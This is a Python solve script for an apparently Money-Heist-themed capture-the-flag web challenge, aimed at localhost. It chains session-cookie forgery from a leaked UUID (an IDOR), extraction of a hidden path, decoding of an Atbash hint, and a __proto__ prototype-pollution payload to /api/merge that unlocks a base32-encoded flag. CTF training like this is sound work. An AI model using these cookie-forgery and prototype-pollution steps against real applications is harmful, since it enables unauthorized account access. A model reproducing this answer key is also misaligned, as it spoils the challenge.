#!/usr/bin/env python3
"""
La Casa de Código — Solve Script
=================================
Automated exploit chain for the La Casa de Código

Steps:
  1. Register & Login → get session cookie
  2. Support Chat UUID Leak → extract employee UUID from response
  3. IDOR via Cookie Manipulation → forge cookie, read employee profile
  4. Extract /mint/governor path from hostage note
  5. Hit /mint/governor → 403 with Atbash-encoded hint
  6. Decode Atbash → get prototype pollution key
  7. Prototype Pollution via /api/merge
  8. Hit /mint/governor again → base32 encoded flag
  9. Decode base32 → flag!

Usage:
  python3 solve.py [--url http://localhost:3000]
"""

import sys
import json
import base64
import re
import argparse
import random
import string
import requests


def atbash_decode(text):
    """Atbash cipher is its own inverse: encoding = decoding."""
    result = []
    for c in text:
        if 'a' <= c <= 'z':
            result.append(chr(219 - ord(c)))
        elif 'A' <= c <= 'Z':
            result.append(chr(155 - ord(c)))
        else:
            result.append(c)
    return ''.join(result)


def base32_decode(encoded):
    padding = (8 - len(encoded) % 8) % 8
    encoded += '=' * padding
    return base64.b32decode(encoded).decode('utf-8')


def solve(base_url):
    s = requests.Session()
    rand_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
    print("\nRegistering a new account...")
    username = f"lisbon_{rand_suffix}"
    res = s.post(f"{base_url}/api/register", json={
        "name": "Raquel Murillo",
        "username": username,
        "password": "plan_paris"
    })
    assert res.status_code == 200, f"  ✗ Registration failed: {res.text}"

    session_cookie = s.cookies.get('session')
    decoded_cookie = json.loads(base64.b64decode(session_cookie))
    print(f"Session cookie: {session_cookie[:40]}...")
    res = s.post(f"{base_url}/api/support/connect", json={"topic": "general_inquiry"})
    assert res.status_code == 200, f"Support connect failed: {res.text}"

    support_data = res.json()
    professor_uuid = support_data.get('last_available_agent')
    assert professor_uuid, "Could not find emp UUID in res "
    print(f"Prof UUID : {professor_uuid}")

    forged_cookie = base64.b64encode(
        json.dumps({"id": professor_uuid}, separators=(',', ':')).encode()
    ).decode()
    print(f"Forged cookie: {forged_cookie}")
    s.cookies.clear()
    s.headers['Cookie'] = f'session={forged_cookie}'

    res = s.get(f"{base_url}/api/account")
    assert res.status_code == 200, f"IDOR failed: {res.text}"

    profile = res.json()
    print(f"Accessed profile of: {profile['name']} (role: {profile['role']})")

    notes = profile.get('notes', '')
    assert notes, "No notes found in profile!"
    print(f"Hostage note found!")

    path_match = re.search(r'(/mint/\w+)', notes)
    assert path_match, "Could not find hidden path in note"
    hidden_path = path_match.group(1)
    print(f"Hidden path extracted: {hidden_path}")
    print(f"\nRequesting {hidden_path} (expecting 403)...")
    res = s.get(f"{base_url}{hidden_path}")
    assert res.status_code == 403, f"Expected 403, got {res.status_code}"

    print(f"403 body: {repr(res.text)}")
    hint_match = re.search(r'<!--\s*(\S+)\s*-->', res.text)
    assert hint_match, "Could not find hint in HTML"
    atbash_hint = hint_match.group(1)

    decoded_key = atbash_decode(atbash_hint)
    print(f"Atbash decoded: {decoded_key}")

    payload = {"__proto__": {decoded_key: True}}
    res = s.post(f"{base_url}/api/merge", json=payload)
    assert res.status_code == 200, f"Merge failed: {res.text}"
    print(f"Object.prototype.{decoded_key} = true")

    print(f"\nRequesting {hidden_path} again (expecting 200)...")
    res = s.get(f"{base_url}{hidden_path}")
    assert res.status_code == 200, \
        f"Still getting {res.status_code}! Pollution may not have worked."

    vault = res.json()
    encoded_flag = vault.get('vault_contents')
    assert encoded_flag, "No vault_contents in respons"
    print(f" Base32 encoded: {encoded_flag[:40]}...")
    flag = base32_decode(encoded_flag)
    print(f"  🏴 FLAG: {flag}")
    return flag


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='La Casa de Código')
    parser.add_argument('--url', default='http://localhost:3000', help='Target URL')
    args = parser.parse_args()

    try:
        solve(args.url)
    except AssertionError as e:
        print(f"\n  ✗ EXPLOIT FAILED: {e}")
        sys.exit(1)
    except Exception as e:
        print(f"\n  ✗ ERROR: {e}")
        sys.exit(1)
